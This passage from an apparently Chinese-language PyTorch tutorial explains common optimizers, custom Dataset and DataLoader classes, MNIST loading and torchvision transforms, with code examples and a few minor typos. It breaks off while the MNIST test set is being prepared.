number">30000</span><span class="token punctuation">,</span>loss<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#4. 模型评估</span>model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#</span>predict <span class="token operator">=</span> model<span class="token punctuation">(</span>x<span class="token punctuation">)</span>predict <span class="token operator">=</span> predict<span class="token punctuation">.</span>cpu<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>detach<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#转化为numpy数组</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">.</span>cpu<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">.</span>cpu<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">.</span>cpu<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>predict<span class="token punctuation">,</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>​</p><h4 id="1-7-3-常见的优化算法介绍">1.7.3 常见的优化算法介绍</h4><p>​</p><h5 id="梯度下降法">梯度下降法</h5><p><code>batch gradient descent</code></p><p>每次迭代都需要把所有样本都送入，这样的好处是每次迭代都顾及了全部的样本，做的是全局最优化，但是有可能达到<strong>局部最优</strong>。</p><p>​</p><h5 id="随机梯度下降法">随机梯度下降法</h5><p><code>Stochastic gradient descent</code></p><p>针对梯度下降算法训练速度过慢的缺点，提出了随机梯度下降算法。</p><p>算法从样本中随机抽出一组，训练后按梯度更新一次，然后再抽取一组，再更新一次，在样本量及其大的情况下，可能不用训练完所有的样本就可以获得一个损失值在可接受范围之内的模型了。</p><p>torch API：<code>torch.optim.SGD()</code></p><p>​</p><h5 id="小批量梯度下降法">小批量梯度下降法</h5><p><code>Mini-batch gradient descent</code></p><p>SGD也存在问题，由于<strong>单个样本的训练可能会带来很多噪声，使得SGD并不是每次迭代都向着整体最优化方向，因此在刚开始训练时可能收敛得很快，但是训练一段时间后就会变得很慢</strong>。在此基础上又提出了小批量梯度下降法，它是每次从样本中随机抽取一小批进行训练，而不是一组，这样即保证了效果又保证的速度。</p><p>​</p><h5 id="动量法">动量法</h5><p><code>Momentum</code></p><p>MSGD算法虽然能带来很好的训练速度，但是在到达最优点的时候<strong>并不能够总是真正到达最优点</strong>，而是在最优点附近徘徊。另一个缺点是算法需要一个合适的学习率。当我们采用小的学习率的时候，会导致网络在训练的时候收敛太慢；当我们采用大的学习率的时候，会导致在训练过程中优化的幅度跳过函数的范围，也就是可能跳过最优点。我们所希望的仅仅是网络在优化的时候网络的损失函数有一个<strong>很好的收敛速度同时又不至于摆动幅度太大</strong>。</p><p>Momentum优化器可以解决问题，它主要是<strong>基于梯度的移动指数加权平均，对网络的梯度进行平滑处理的，让梯度的摆动幅度变得更小</strong>。<br>$$<br>\begin{array}{c}<br>&amp;gradent = 0.8 \nabla w + 0.2 history\_gradent  &amp;\\<br>&amp;w = w - \alpha \cdot gradent &amp;<br>\end{array}<br>$$</p><p>注：t+1的的<em>histroy_gradent</em> 为第t次的<em>gradent</em></p><p>​</p><h5 id="AdaGrad">AdaGrad</h5><p>AdaGrad算法就是将每一个参数的每一次迭代的梯度取平方累加后在开方，用全局学习率除以这个数，作为学习率的动态更新，从而达到<strong>自适应学习率</strong>的效果<br>$$<br>\begin{array}{c}<br>&amp;gradent = history_gradent + (\nabla w)^2 \\<br>&amp;w = w - \frac{\alpha}{\sqrt{gradent}+\delta} \nabla w<br>\end{array}<br>$$</p><p>注：$\delta$为小常数，为了数值稳定大约设置为$10^{-7}$</p><p>​</p><h5 id="RMSProp">RMSProp</h5><p>为了<strong>进一步优化损失函数在更新中存在摆动幅度过大的问题，并进一步加快函数的收敛速度</strong>，RMSProp算法对参数的梯度使用了平方加权平均数。<br>$$<br>\begin{array}{c}<br>&amp; gradent = 0.8 \cdot history_gradent + 0.2 \cdot (\nabla w)^2 \\<br>&amp; w = w - \frac{\alpha}{\sqrt{gradent}+\delta} \nabla w<br>\end{array}<br>$$</p><p>​</p><h5 id="Adam">Adam</h5><p><code>Adaptive Moment Estimation</code></p><p>Adam算法是将Momentum算法和RMSProp算法结合起来使用的一种算法，能够防止梯度的摆幅过大，同时还能够加收敛速度<br>$$<br>\begin{array}{c}<br>&amp; v_w = 0,s_w = 0 \\<br>&amp; v_w = 0.8v  + 0.2 \nabla w \qquad \\<br>&amp; s_w = 0.8s + 0.2(\nabla w)^2 \qquad \\<br>&amp; w = w - \frac{\alpha}{\sqrt{s_w}+\delta} v_w<br>\end{array}<br>$$</p><ol><li>需要初始化梯度的累积量和平方累积量</li><li>第 t 轮训练中可以计算得到<code>Momentum</code>和<code>RMSProp</code>的参数更新</li><li>对其中的值进行处理后</li></ol><p>torch API：<code>torch.optim.Adam()</code></p><p>​</p><p>​</p><h3 id="1-8-PyTorch数据加载">1.8 PyTorch数据加载</h3><h4 id="1-8-1-模型中使用数据加载器的目的">1.8.1 模型中使用数据加载器的目的</h4><p>在深度学习中，数据量通常非常大，不可能一次性的在模型中进行向前的计算和反向传播。我们经常会对整个数据随机打乱顺序，把数据处理成一个个<code>batch</code>，同时还会对数据进行预处理。</p><p>​</p><p>​</p><h4 id="1-8-2-数据集类">1.8.2  数据集类</h4><h5 id="Dataset基类介绍">Dataset基类介绍</h5><p>torch中提供了数据集基类<code>torch.utils.data.Dataset</code>，继承这个基类，我们能够非常快速的实现对数据的加载。</p><p><code>torch.utils.data.Dataset</code>源码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Dataset</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""An abstract class representing a Dataset.    All other datasets should subclass it. All subclasses should override    ``__len__``, that provides the size of the dataset, and ``__getitem__``,    supporting integer indexing in range from 0 to len(self) exclusive.    """</span>    <span class="token keyword">def</span> <span class="token function">__getitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> NotImplementedError    <span class="token keyword">def</span> <span class="token function">__len__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> NotImplementedError    <span class="token keyword">def</span> <span class="token function">__add__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> ConcatDataset<span class="token punctuation">(</span><span class="token punctuation">[</span>self<span class="token punctuation">,</span> other<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们需要在自定义的数据集类中继承Dataset类，同时还需要实现两个方法：</p><ol><li><code>__len__</code>方法，能够实现通过全局的<code>len()</code>方法获取其中的元素个数</li><li><code>__getitem__</code>方法，能够通过传入索引的方式获取数据，例如通过<code>dataset[i]</code>获取其中的第<code>i</code>条数据</li></ol><p>​</p><p>​</p><h5 id="数据加载案例">数据加载案例</h5><p><a href="http://archive.ics.uci.edu/ml/datasets/SMS+Spam+Collection">数据来源</a></p><p>数据介绍：SMS Spam Collection是用于骚扰短信识别的经典数据集，完全来自真实短信内容，包括4831条正常短信和747条骚扰短信。正常短信和骚扰短信保存在一个文本文件中。 每行完整记录一条短信内容，每行开头通过ham和spam标识正常短信和骚扰短信</p><p>数据实例：</p><p><img src="dataset%E6%95%B0%E6%8D%AE%E7%A4%BA%E4%BE%8B.png" alt=""></p><p>实现如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> torch<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>data <span class="token keyword">import</span> Dataset<span class="token punctuation">,</span>DataLoader<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata_path <span class="token operator">=</span> <span class="token string">r"data\SMSSpamCollection"</span><span class="token keyword">class</span> <span class="token class-name">CifarDataset</span><span class="token punctuation">(</span>Dataset<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        lines <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>data_path<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>        <span class="token comment">#对数据进行处理，前4个为label，后面的为短信内容</span>        lines <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">]</span>        <span class="token comment">#转化为dataFrame</span>        self<span class="token punctuation">.</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>lines<span class="token punctuation">,</span>columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"label"</span><span class="token punctuation">,</span><span class="token string">"sms"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__getitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>        single_item <span class="token operator">=</span> self<span class="token punctuation">.</span>df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span>index<span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> single_item<span class="token punctuation">.</span>values<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>single_item<span class="token punctuation">.</span>values<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__len__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>df<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后对Dataset进行实例化，可以跌倒获取其中的数据</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">d <span class="token operator">=</span> CifarDataset<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-8-3-迭代数据集">1.8.3 迭代数据集</h4><p><code>torch.utils.data.DataLoader</code>提供了的方法</p><ul><li>批处理数据<code>Batching the data</code></li><li>打乱数据<code>Shuffling the data</code></li><li>使用多线程 <code>multiprocessing</code> 并行加载数据</li></ul><p>​</p><p><code>DataLoader</code>使用示例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> torch<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>data <span class="token keyword">import</span> DataLoaderdataset <span class="token operator">=</span> CifarDataset<span class="token punctuation">(</span><span class="token punctuation">)</span>data_loader <span class="token operator">=</span> DataLoader<span class="token punctuation">(</span>dataset<span class="token operator">=</span>dataset<span class="token punctuation">,</span>batch_size<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>shuffle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>num_workers<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>drop_last<span class="token operator">=</span>Ture<span class="token punctuation">)</span><span class="token comment">#遍历，获取其中的每个batch的结果</span><span class="token keyword">for</span> index<span class="token punctuation">,</span> <span class="token punctuation">(</span>label<span class="token punctuation">,</span> context<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>data_loader<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>label<span class="token punctuation">,</span>context<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数：</p><ul><li><code>dataset</code>：提前定义的dataset的实例</li><li><code>batch_siz</code>e:传入数据的batch的大小，常用128,256等等</li><li><code>shuffle</code>：bool类型，表示是否在每次获取数据的时候提前打乱数据</li><li><code>num_workers</code>：加载数据的线程数</li></ul><p>​</p><p><strong>注意：</strong></p><ol><li><code>len(dataset)</code> = 数据集的样本数</li><li><code>len(dataloader) = math.ceil(样本数/batch_size)</code> 即向上取整</li></ol><p>​</p><p>​</p><h4 id="1-8-4-PyTorch自带的数据集">1.8.4 PyTorch自带的数据集</h4><p>pytorch中自带的数据集由两个上层API提供，分别是<code>torchvision</code>和<code>torchtext</code></p><p>其中：</p><ol><li><p><code>torchvision</code>提供了对图片数据处理相关的api和数据</p><p>数据位置：<code>torchvision.datasets</code>，例如：<code>torchvision.datasets.MNIST</code>（手写数字图片数据）</p></li><li><p><code>torchtext</code>提供了对文本数据处理相关的API和数据</p><p>数据位置：<code>torchtext.datasets</code>,例如：<code>torchtext.datasets.IMDB</code>（电影评论文本数据）</p></li></ol><p>​</p><p>​</p><h5 id="torchversion-datasets">torchversion.datasets</h5><p><code>torchversoin.datasets</code>中的数据集类都是继承自<code>Dataset</code>，意味着：直接对<code>torchvision.datasets.MNIST</code>进行实例化就可以得到<code>Dataset</code>的实例</p><p>API中的参数：</p><p><code> torchvision.datasets.MNIST(root='/files/', train=True, download=True, transform=)</code></p><ol><li><code>root</code>参数表示数据存放的位置</li><li><code>train：</code>bool类型，表示是使用训练集的数据还是测试集的数据</li><li><code>download：</code>bool类型，表示是否需要下载数据到root目录</li><li><code>transform:</code>实现的对图片的处理函数</li></ol><p>​</p><h5 id="MNIST数据集">MNIST数据集</h5><p>数据集原始<a href="http://yann.lecun.com/exdb/mnist/">地址</a></p><p>MNIST是由<code>Yann LeCun</code>等人提供的免费的图像识别的数据集，其中包括60000个训练样本和10000个测试样本，其中图拍了的尺寸已经进行的标准化的处理，都是黑白的图像，大小为<code>28X28</code></p><p>​</p><p>执行代码，下载数据，观察数据类型：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torchvisiondataset <span class="token operator">=</span> torchvision<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>MNIST<span class="token punctuation">(</span>root<span class="token operator">=</span><span class="token string">"./data"</span><span class="token punctuation">,</span>train<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>download<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>transform<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>dataset<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载的数据如下：</p><p><img src="MNIST-dataset.png" alt=""></p><p>返回值的第0个为Image类型，可以调用show() 方法打开，发现为手写数字5</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">img <span class="token operator">=</span> dataset<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>img<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#打开图片</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="MNIST-dataset-5.png" alt=""></p><p>​</p><p>​</p><h3 id="1-9-PyTorch手写数字识别">1.9 PyTorch手写数字识别</h3><h4 id="1-思路和流程分析">1. 思路和流程分析</h4><ol><li>准备数据，准备DataLoader</li><li>构建模型，使用torch构造一个深层的神经网络</li><li>模型训练</li><li>模型保存</li><li>模型评估，使用测试集观察模型好坏</li></ol><p>​</p><p>​</p><h4 id="2-准备训练集和测试集">2. 准备训练集和测试集</h4><p>调用MNIST返回的结果中图形数据是一个Image对象,需要对其进行处理</p><p>​</p><h5 id="torchvision-transforms的图形数据处理方法"><code>torchvision.transforms</code>的图形数据处理方法</h5><p><code>torchvision.transforms.ToTensor</code></p><p>把一个取值范围是**[0,255]<strong>的<code>PIL.Image</code>或者shape为</strong>(H,W,C)<strong>的<code>numpy.ndarray</code>转换成形状为</strong>[C,H,W]**</p><p>其中**(H,W,C)<strong>意思为</strong>(高，宽，通道数)<strong>，黑白图片的通道数只有1，其中每个像素点的取值为</strong>[0,255]<strong>，彩色图片的通道数为</strong>(R,G,B)<strong>，每个通道的每个像素点的取值为</strong>[0,255]**，三个通道的颜色相互叠加，形成了各种颜色</p><p>​</p><p>示例如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> torchvision <span class="token keyword">import</span> transforms<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npdata <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span>img <span class="token operator">=</span> data<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>img_tensor <span class="token operator">=</span> transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span> <span class="token comment"># 转换成tensor</span><span class="token keyword">print</span><span class="token punctuation">(</span>img_tensor<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>img_tensor<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shape<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>img_tensor<span class="token punctuation">:</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                 <span class="token punctuation">[</span> <span class="token number">34</span><span class="token punctuation">,</span>  <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">229</span><span class="token punctuation">,</span>  <span class="token number">87</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                 <span class="token punctuation">[</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                 <span class="token punctuation">[</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span>int32<span class="token punctuation">)</span>new shape<span class="token punctuation">:</span>torch<span class="token punctuation">.</span>Size<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：</p><p><code>transforms.ToTensor</code>对象中有<code>__call__</code>方法，所以可以对其示例能够传入数据获取结果</p><p><code>torchvision.transforms.Normalize(mean, std)</code></p><p>给定均值：mean，shape和图片的通道数相同(指的是每个通道的均值)，方差：std，和图片的通道数相同(指的是每个通道的方差)，将会把<code>Tensor</code>规范化处理。</p><p>即：<code>Normalized_image=(image-mean)/std</code>。</p><p>例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> torchvision <span class="token keyword">import</span> transforms<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> torchvisiondata <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span>img <span class="token operator">=</span> data<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>img <span class="token operator">=</span> transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span> <span class="token comment"># 转换成tensor</span><span class="token keyword">print</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>norm_img <span class="token operator">=</span> transforms<span class="token punctuation">.</span>Normalize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span> <span class="token comment">#进行规范化处理</span><span class="token keyword">print</span><span class="token punctuation">(</span>norm_img<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出如下：</p><pre class="line-numbers language-none"><code class="language-none">tensor([[[177, 223],         [ 71, 182]],        [[153, 120],         [173,  33]],        [[162, 233],         [194,  73]]], dtype=torch.int32)***************************************************************************************tensor([[[167, 213],         [ 61, 172]],        [[143, 110],         [163,  23]],        [[152, 223],         [184,  63]]], dtype=torch.int32)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：在sklearn中，默认上式中的std和mean为数据每列的std和mean，sklearn会在标准化之前算出每一列的std和mean。</p><p>但是在api：Normalize中并没有帮我们计算，所以我们需要手动计算</p><ol><li><p>当mean为全部数据的均值，std为全部数据的std的时候，才是进行了标准化。</p></li><li><p>如果mean(x)不是全部数据的mean的时候，std(y)也不是的时候，Normalize后的数据分布满足下面的关系<br>$$<br>\begin{align*}<br>&amp;new_mean = \frac{mean-x}{y}&amp;， mean为原数据的均值，x为传入的均值x \<br>&amp;new_std = \frac{std}{y} &amp;，y为传入的标准差y\<br>\end{align*}<br>$$</p></li></ol><p>2.1.3 <code>torchvision.transforms.Compose(transforms)</code></p><p>将多个<code>transform</code>组合起来使用。</p><p>例如</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">transforms<span class="token punctuation">.</span>Compose<span class="token punctuation">(</span><span class="token punctuation">[</span>     torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">#先转化为Tensor</span>     torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>Normalize<span class="token punctuation">(</span>mean<span class="token punctuation">,</span>std<span class="token punctuation">)</span> <span class="token comment">#在进行正则化</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><h5 id="准备MNIST数据集的Dataset和DataLoader">准备MNIST数据集的Dataset和DataLoader</h5><p>准备训练集</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torchvision<span class="token comment">#准备数据集，其中0.1307，0.3081为MNIST数据的均值和标准差，这样操作能够对其进行标准化</span><span class="token comment">#因为MNIST只有一个通道（黑白图片）,所以元组中只有一个值</span>dataset <span class="token operator">=</span> torchvision<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>MNIST<span class="token punctuation">(</span><span class="token string">'/data'</span><span class="token punctuation">,</span> train<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                             transform<span class="token operator">=</span>torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>Compose<span class="token punctuation">(</span><span class="token punctuation">[</span>                               torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                               torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>Normalize<span class="token punctuation">(</span>                                 <span class="token punctuation">(</span><span class="token number">0.1307</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0.3081</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                             <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#准备数据迭代器                          </span>train_dataloader <span class="token operator">=</span> torch<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>data<span class="token punctuation">.</span>DataLoader<span class="token punctuation">(</span>dataset<span class="token punctuation">,</span>batch_size<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>shuffle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>准备测试集</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torchvision<span class="token comment">#准备数据集，其中0.1307，0.3081为MNIST数据的均值和标准差，这样操作能够对其进行标准化</span><span class="token comment">#因为MNIST只有一个通道（黑白图片）,所以元组中只有一个值</span>dataset <span class="token operator">=</span> torchvision<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>MNIST<span class="token punctuation">(</span><span class="token string">'/data'</span><span class="token punctuation">,</span> train<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> download<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                             transform<span class="token operator">=</span>torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>Compose<span class="token punctuation">(</span><span class="token punctuation">[</span>                               torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 